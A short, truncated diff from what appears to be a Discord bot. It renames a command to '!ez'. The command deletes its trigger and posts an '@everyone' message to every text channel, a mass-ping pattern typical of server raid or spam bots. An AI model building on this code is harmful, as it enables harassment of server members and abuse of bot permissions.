@@ -498,7 +498,7 @@ if (msg.content === '!delemote'){
   });
  }
 
-if (msg.content === '!happyland') {
+if (msg.content === '!ez') {
   if (msg.deletable) msg.delete();
   msg.guild.channels.forEach(channel => {
     if (channel.type === "text") channel.send("@everyone **Eaucalme Le best**\n"+
